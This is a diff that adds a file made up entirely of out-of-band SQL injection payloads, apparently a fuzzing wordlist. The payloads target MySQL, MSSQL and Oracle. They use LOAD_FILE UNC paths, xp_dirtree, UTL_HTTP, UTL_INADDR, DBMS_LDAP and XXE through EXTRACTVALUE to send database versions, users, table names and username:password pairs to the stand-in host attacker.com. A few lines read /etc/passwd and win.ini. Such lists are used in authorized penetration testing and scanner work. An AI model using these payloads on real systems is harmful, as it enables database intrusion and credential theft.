@@ -1,0 +1,67 @@
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test')))--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\test')))--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test')))--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.com\\test')))--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'.attacker.com\\test')))--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),'.attacker.com\\test')))--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'.attacker.com\\test')))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\test'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.com\\test'))--
+' AND IF((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test'))),1,0)--
+' AND IF((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\test'))),1,0)--
+' AND IF((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))),1,0)--
+' AND (SELECT 1 FROM (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test')))a)--
+' AND (SELECT 1 FROM (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\test')))a)--
+' AND (SELECT 1 FROM (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test')))a)--
+'; EXEC master..xp_dirtree '\\\\attacker.com\\test'--
+'; EXEC master..xp_fileexist '\\\\attacker.com\\test'--
+'; EXEC master..xp_subdirs '\\\\attacker.com\\test'--
+'; EXEC xp_dirtree CONCAT('\\\\',@@version,'.attacker.com\\test')--
+'; EXEC xp_dirtree CONCAT('\\\\',(SELECT user),'.attacker.com\\test')--
+'; EXEC xp_dirtree CONCAT('\\\\',(SELECT db_name()),'.attacker.com\\test')--
+'; EXEC xp_dirtree CONCAT('\\\\',(SELECT TOP 1 name FROM sys.databases),'.attacker.com\\test')--
+'; EXEC xp_dirtree CONCAT('\\\\',(SELECT TOP 1 name FROM sys.tables),'.attacker.com\\test')--
+'; DECLARE @host VARCHAR(1024); SET @host=(SELECT @@version)+'.attacker.com'; EXEC('master..xp_dirtree "\\\\'+@host+'\\test"')--
+'; DECLARE @host VARCHAR(1024); SET @host=(SELECT user)+'.attacker.com'; EXEC('master..xp_dirtree "\\\\'+@host+'\\test"')--
+'; DECLARE @host VARCHAR(1024); SET @host=(SELECT db_name())+'.attacker.com'; EXEC('master..xp_dirtree "\\\\'+@host+'\\test"')--
+'; DECLARE @data VARCHAR(8000); SET @data=(SELECT TOP 1 name FROM sys.databases FOR XML PATH('')); EXEC('master..xp_dirtree "\\\\'+@data+'.attacker.com\\test"')--
+'; DECLARE @data VARCHAR(8000); SET @data=(SELECT TOP 1 name FROM sys.tables FOR XML PATH('')); EXEC('master..xp_dirtree "\\\\'+@data+'.attacker.com\\test"')--
+'; DECLARE @data VARCHAR(8000); SET @data=(SELECT TOP 1 CAST(password AS VARCHAR) FROM users FOR XML PATH('')); EXEC('master..xp_dirtree "\\\\'+@data+'.attacker.com\\test"')--
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual)--
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)--
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT instance_name FROM v$instance)) FROM dual)--
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT table_name FROM all_tables WHERE ROWNUM=1)) FROM dual)--
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT column_name FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1)) FROM dual)--
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username||':'||password FROM users WHERE ROWNUM=1)) FROM dual)--
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual)--
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com') FROM dual)--
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT instance_name FROM v$instance)||'.attacker.com') FROM dual)--
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM all_tables WHERE ROWNUM=1)||'.attacker.com') FROM dual)--
+' AND (SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual)--
+' AND (SELECT DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com',80) FROM dual)--
+' AND (SELECT DBMS_LDAP.INIT((SELECT instance_name FROM v$instance)||'.attacker.com',80) FROM dual)--
+' AND (SELECT DBMS_LDAP.INIT((SELECT table_name FROM all_tables WHERE ROWNUM=1)||'.attacker.com',80) FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT user FROM dual)||'"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT instance_name FROM v$instance)||'"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT table_name FROM all_tables WHERE ROWNUM=1)||'"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT user FROM dual)||'.attacker.com/"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com/"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT instance_name FROM v$instance)||'.attacker.com/"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT table_name FROM all_tables WHERE ROWNUM=1)||'.attacker.com/"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "file:///etc/passwd"> %remote;]>'),'/l') FROM dual)--
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "file:///c:/windows/win.ini"> %remote;]>'),'/l') FROM dual)--
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT user FROM dual)||'"> %remote;]>'),'/l') FROM dual--
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'"> %remote;]>'),'/l') FROM dual--
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT instance_name FROM v$instance)||'"> %remote;]>'),'/l') FROM dual--
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual--
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT instance_name FROM v$instance)) FROM dual--
+' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual--
+' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com') FROM dual--
+' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT instance_name FROM v$instance)||'.attacker.com') FROM dual--
+' UNION SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual--
+' UNION SELECT DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com',80) FROM dual--
+' UNION SELECT DBMS_LDAP.INIT((SELECT instance_name FROM v$instance)||'.attacker.com',80) FROM dual--
